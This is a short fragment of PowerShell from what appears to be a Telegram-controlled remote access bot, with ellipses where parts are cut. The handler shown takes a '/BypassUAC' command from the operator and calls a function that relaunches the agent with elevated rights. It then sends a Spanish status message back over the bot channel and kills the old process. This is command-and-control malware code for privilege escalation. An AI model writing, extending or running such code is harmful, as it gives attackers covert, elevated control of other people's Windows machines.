...
function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
 ...
 if ($comando -like "/BypassUAC") {$id = (Get-Process powershell).Id; BypassUAC-CyberVaca -comando $agent_bot;$texto = "Ejecutado el BypassUAC, espere la nueva conexion del BOT";envia-mensaje -text $texto -botkey $botkey -chat $chat_id;  Stop-Process -id $id}
